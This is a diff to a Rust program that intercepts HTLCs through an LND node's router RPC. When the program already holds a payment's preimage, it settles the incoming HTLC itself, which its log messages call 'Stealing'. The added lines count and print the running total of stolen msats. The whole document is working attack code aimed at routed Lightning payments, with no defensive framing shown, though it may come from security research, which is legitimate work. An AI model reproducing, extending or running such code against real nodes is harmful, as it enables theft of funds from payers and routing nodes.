@@ -109,6 +109,7 @@ async fn main() {
 
     // HTLC interceptor part
     println!("starting HTLC interception");
+    let storage_htlc_interceptor = storage.clone();
     spawn(async move {
         let mut client_router_htlc_intercept = client_router.clone();
         let (tx, rx) = tokio::sync::mpsc::channel::<
@@ -129,10 +130,16 @@ async fn main() {
         {
             println!("htlc {:?}", htlc);
 
-            let map = storage.clone();
-            let response = match map.lock().await.get(htlc.payment_hash) {
+            let map = storage_htlc_interceptor.clone();
+            let mut db = map.lock().await;
+            let response = match db.get(htlc.payment_hash) {
                 Some(preimage) => {
-                    println!("HTLC preimage saved! Stealing...");
+                    let steal_amt = htlc.incoming_amount_msat;
+                    println!("HTLC preimage saved! Stealing {steal_amt} msats...");
+
+                    let total = db.add_stolen(steal_amt);
+                    println!("New total amount stolen: {total} msats");
+
                     tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
                         incoming_circuit_key: htlc.incoming_circuit_key,
                         action: 0, // 0 settle, 1 fail, 2 resume
@@ -158,6 +165,9 @@ async fn main() {
     });
 
     println!("started htlc event interception");
+
+    let stolen = storage.lock().await.total_stolen();
+    println!("current amount stolen: {stolen} msats");
 
     // TODO
     loop {}
